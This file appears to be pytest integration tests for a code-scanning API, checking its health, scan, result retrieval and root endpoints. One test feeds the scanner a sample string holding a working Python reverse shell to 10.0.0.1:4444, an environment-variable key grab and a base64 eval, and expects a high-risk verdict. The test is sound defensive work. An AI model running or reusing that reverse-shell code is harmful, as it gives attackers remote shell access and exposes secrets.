"""
API integration tests.
"""

import pytest
from httpx import AsyncClient, ASGITransport
from app.main import app


@pytest.fixture
def anyio_backend():
    return "asyncio"


@pytest.mark.anyio
async def test_health_endpoint():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        response = await client.get("/api/v1/health")
        assert response.status_code == 200
        data = response.json()
        assert data["status"] == "ok"
        assert "docker_available" in data
        assert "llm_configured" in data


@pytest.mark.anyio
async def test_scan_safe_code():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        response = await client.post("/api/v1/scan", json={
            "source_code": 'def add(a, b):\n    return a + b\n',
            "enable_llm": False,
            "enable_sandbox": False,
        })
        assert response.status_code == 200
        data = response.json()
        assert data["risk_level"] in ("safe", "low")
        assert "findings" in data
        assert "risk_score" in data


@pytest.mark.anyio
async def test_scan_malicious_code():
    malicious_code = '''
import socket
import subprocess
import os

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.0.0.1", 4444))
    subprocess.Popen(["/bin/sh", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())

# Steal environment variables
api_key = os.environ.get("API_KEY")
exec("import base64; eval(base64.b64decode('cHJpbnQoMSk='))")
'''
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        response = await client.post("/api/v1/scan", json={
            "source_code": malicious_code,
            "enable_llm": False,
            "enable_sandbox": False,
        })
        assert response.status_code == 200
        data = response.json()
        assert data["risk_level"] in ("high", "critical")
        assert data["risk_score"] >= 50
        assert len(data["findings"]) > 0


@pytest.mark.anyio
async def test_scan_result_retrieval():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # First submit a scan
        response = await client.post("/api/v1/scan", json={
            "source_code": "print('hello')",
            "enable_llm": False,
            "enable_sandbox": False,
        })
        assert response.status_code == 200
        scan_id = response.json()["scan_id"]

        # Then retrieve it
        response = await client.get(f"/api/v1/scan/{scan_id}")
        assert response.status_code == 200
        assert response.json()["scan_id"] == scan_id


@pytest.mark.anyio
async def test_scan_not_found():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        response = await client.get("/api/v1/scan/nonexistent")
        assert response.status_code == 404


@pytest.mark.anyio
async def test_root_endpoint():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        response = await client.get("/")
        assert response.status_code == 200
        # Root may return HTML (UI mode) or JSON (API mode)
        content_type = response.headers.get("content-type", "")
        assert "text/html" in content_type or "application/json" in content_type
